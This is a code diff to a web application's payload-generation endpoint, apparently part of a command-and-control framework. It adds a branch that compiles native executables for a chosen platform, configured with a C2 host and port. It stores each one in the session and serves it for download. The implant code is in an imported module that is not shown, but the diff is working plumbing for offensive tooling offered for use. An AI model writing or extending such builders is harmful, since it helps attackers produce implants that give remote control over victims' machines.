@@ -801,6 +801,44 @@ def generate_payload():
         metrics_collector.increment_counter('api_requests')
         data = request.json or {}
         
+        # Check if native payload requested
+        if data.get('type') == 'native':
+            from native_payload_builder import native_builder
+            
+            config = {
+                'platform': data.get('platform', 'linux'),
+                'c2_host': data.get('bind_host', 'localhost'),
+                'c2_port': data.get('bind_port', 4433)
+            }
+            
+            log_debug(f"Generating native {config['platform']} payload", "INFO", "Payload")
+            
+            # Compile native payload
+            result = native_builder.compile_payload(config)
+            
+            if result['success']:
+                session['payload_path'] = result['path']
+                session['payload_filename'] = f"payload_{config['platform']}"
+                session['payload_type'] = 'native'
+                session['payload_platform'] = config['platform']
+                
+                log_debug(f"Native payload generated: {result['size']} bytes", "INFO", "Payload")
+                
+                return jsonify({
+                    'success': True,
+                    'message': result['message'],
+                    'payload_size': result['size'],
+                    'payload_type': 'native_executable',
+                    'platform': result['platform'],
+                    'filename': os.path.basename(result['path']),
+                    'hash': result['hash'],
+                    'config': config,
+                    'download_url': '/api/download-payload'
+                })
+            else:
+                log_debug(f"Native payload generation failed: {result['error']}", "ERROR", "Payload")
+                return jsonify({'error': result['error']}), 500
+        
         # Import the enhanced payload generator
         from web_payload_generator import web_payload_gen
         
